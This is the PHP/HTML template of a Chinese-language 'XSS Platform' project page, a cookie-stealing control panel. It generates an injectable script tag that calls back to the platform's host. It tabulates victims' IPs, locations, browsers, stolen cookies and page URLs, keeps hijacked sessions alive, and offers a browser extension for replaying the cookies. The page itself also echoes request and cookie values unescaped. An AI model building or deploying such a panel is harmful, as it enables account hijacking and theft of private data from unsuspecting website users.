<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
<title>XSS Platform</title>
<link rel="stylesheet" href="<?php echo  STATIC_STYLE_URL?>screen.css" type="text/css" media="screen, projection"> 
<link rel="stylesheet" href="<?php echo  STATIC_STYLE_URL?>print.css" type="text/css" media="print"> 
<!--[if lt IE 8]><link rel="stylesheet" href="<?php echo  STATIC_STYLE_URL?>ie.css" type="text/css" media="screen, projection"><![endif]-->
<link rel="stylesheet" href="<?php echo  STATIC_STYLE_URL?>style.css" type="text/css" media="screen, projection">
<script type="text/javascript" src="<?php echo STATIC_JS_URL ?>jquery.js"></script>
<?php require_once TEMPLATE_PATH."xing/header.tpl.php"; ?>
<style>
ul { margin:0; width:230px; overflow:scroll-x; word-break:break-all}
.ohidden ul { height:18px; overflow:hidden }
a.oall,a.un { text-decoration:none }
td { vertical-align:top }
</style>

<script type="text/javascript">
$(document).ready(function(){
	$("a.oall").click(function(){
		if($(this).attr("class")=="oall"){
			$("table tbody tr").attr("class","");
			$("a.un").html("-折叠");
			$(this).attr("class","uall");
			$(this).html("-全部");	
		}else{
			$("table tbody tr").attr("class","ohidden");
			$("a.un").html("+展开");
			$(this).attr("class","oall");
			$(this).html("+全部");	
		}
	});
	$("a.un").click(function(){
		if($(this).parent().parent().attr("class")=="ohidden"){
			$(this).parent().parent().attr("class","");
			$(this).html("-折叠");
		}else{
			$(this).parent().parent().attr("class","ohidden");
			$(this).html("+展开");	
		}
	});
});

</script>



<div id="xoxo">
<h1>xss </h1>
<div class="left menus">
	<div class="menutitle">

<?php  echo  $_COOKIE['xing_name'].";"  ?> <a href="?m=user&a=logout">退出</a><br />

		<a class="left" href="<?php echo SITE_ROOT ?>?m=xing">我的项目</a>
		<a class="right" href="?m=project&a=add">创建</a>
	</div>
	<style>
ul { margin:0; width:140px; overflow:scroll-x; word-break:break-all}
.ohidden ul { height:18px; overflow:hidden }
a.oall,a.un { text-decoration:none }
td { vertical-align:top }
</style>

<table height="200">
	<ul>	 
				 			</ul>
			<div class="menutitle">
			<a class="left" href="?m=project&a=edit">密码修改</a>
			</div>
                        
			<div class="menutitle">
			<a class="left" href="">特别感谢</a>
			</div>
			<ul>
			<li><a href="#">感谢<b>Yasen</b>的框架！</a></li>
		
			</ul>
			<div class="menutitle">
			<a class="left" href="">本项目源码</a>
			</div>
			<ul>
			<li><a href="xss.zip">下载</a></li>
			</ul>
			</table>
	</div></head>
<body>
<div class="span-19 left">
<p>当前位置： <a href="<?php echo SITE_ROOT ?>">首页</a> > 项目内容</p>
<table border="0" cellspacing="0" cellpadding="0">
	<caption>
    插件说明：<a id="plugin" href="/xsser.crx" download><button>安装插件</button></a>，下载后直接拖至google浏览器上面安装，安装后点击google浏览器右上角的小白帽
    <br />
    插件使用：复制 <?php echo SITE_ROOT ?>?m=project&a=cha&pid=<?php  echo $_GET[pid];?>  到输入框回车，如果此项目有截取到cookis，才会正常显示
     

    </caption>

    <h3>


      
      <a class="right" style="font-size:12px; margin-left:10px" href="<?php echo SITE_ROOT ?>?m=code&a=code&pid=<?php  echo $_GET[pid];?>">辅助代码</a>
      <a class="right" style="font-size:12px; margin-left:10px" href="<?php echo SITE_ROOT ?>?m=code&a=js&pid=<?php  echo $_GET[pid];?>">js代码</a>
      <a class="right" style="font-size:12px; margin-left:10px" href="<?php echo SITE_ROOT ?>?m=project&a=pei&pid=<?php  echo $_GET[pid];?>">配置</a>
      项目名称: <?php  echo  $pro['name']?><span style="color:red"><?php if ($pro['iscrsf']==1)echo "已开启crsf"?></span> <a  href="<?php echo SITE_ROOT ?>?m=project&a=onpei&g=1&pid=<?php  echo $_GET[pid];?>"><?php if ($pro['iscrsf']==1)echo "关闭"?></a></h3>

<code>
<?php  
			            $url=SITE_ROOT."?u=".$pro['url'];
 echo   htmlentities("<script  src=\"{$url}\"></script>"); 
 ?> 
  
</code>
  短域名：<a href="http://126.am/" target="_blank">申请</a>
    </caption>
	<thead>
		<tr>
        	<th width="100"><a href="javascript:void(0)" class="oall" style="font-weight:normal">+全部</a></th>
        	<th width="100">信息</th>
        	<th width="200">Cookies</th>
        	<th width="150">地址</th>
	        <th width="10">保持</th>
                <th width="60">操作</th>
		</tr>
		</thead>
		<tbody>
        				
		   <tr class="ohidden">
                 <?php
			 
			 if(is_array($browsers)){
			  
			   
			   foreach($browsers  as  $browser){
		  
		  $utime=date("Y-m-d H:i:s",$browser['dateline']);
                    load_func("IptoAddr");
		   $addr=ip_to_addr($browser['ip']);
    			$info=new InfoModel($browser['bid']);

       $info=$info->get();
                              if ($info['cookie']){
                             //$Url=htmlentities($info['Url']);
                              $cookie=htmlentities($info['cookie']);
                             $zhuangtai=htmlentities($info['sk_status']);
                             if ($zhuangtai=="200")
                                        $zhuangtai="ok";
				print<<<END
                 <td><a href="javascript:void(0)" class="un">+展开</a></td>
              <td><ul><li>IP:{$browser['ip']}</li><li> 地址：$addr</li><li>操作系统：{$browser['os']}</li><li>浏览器：{$browser['type']}</li><li>时间：$utime</li></ul></td>
<td><ul><li>$cookie</li></ul></td>
<td><ul><li>{$info['url']}</li></ul></td>
			
<td><ul><li>保持:$zhuangtai</li><li>在线:{$browser['active']}</li></ul></td>
                        
			  <td>
                  
                  <a href="?m=xing&a=del&bid={$browser['bid']}"> 删除 </a></td>
		   <tr>
              
 
END;
                                  }	
				   
			   }
			   
				 
			 }
				
			
			
			?>
             
            </tr>
            				

            	
	</tbody>
</table>
</div>
</div>
</div>
</body>
</html>